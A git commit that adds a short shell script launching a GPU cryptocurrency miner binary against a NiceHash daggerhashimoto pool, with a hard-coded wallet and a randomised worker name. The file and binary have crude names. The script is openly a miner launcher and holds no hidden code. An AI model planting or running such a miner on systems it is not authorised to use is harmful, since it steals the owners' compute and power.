b042542f88f939f4081b3d7175228576b2801281
renilo <88342640+renilo@users.noreply.github.com>
2021-08-27 20:22:38 +0700

    Create kontol1.sh

---
+++ kontol1.sh
@@ -0,0 +1,9 @@
+POOL=nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353
+
+WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
+
+WORKER=$(echo $(shuf -i 1-10 -n 1)-GPU)
+
+chmod +x memek1
+
+./memek1 -pool $POOL -wal $WALLET.$WORKER -pass x -proto 4 -stales 0
